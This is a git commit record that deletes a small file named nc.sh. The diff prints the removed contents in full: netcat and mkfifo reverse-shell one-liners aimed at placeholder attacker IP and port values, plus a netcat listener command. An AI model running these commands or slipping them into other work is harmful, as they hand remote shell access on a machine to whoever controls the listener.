4f2b8b0d385163ba889cdb85403f6e1a3241bdd7
Q <155090912+QOLT45EXE@users.noreply.github.com>
2025-04-05 10:27:00 -0700

    Delete nc.sh

--- nc.sh
+++
@@ -1,6 +0,0 @@
-# reverse shell, attacker ip and port
-nc -e /bin/bash <IP> <PORT>
-# no -e? bash fallback
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
-# listener
-nc -lvnp <port>
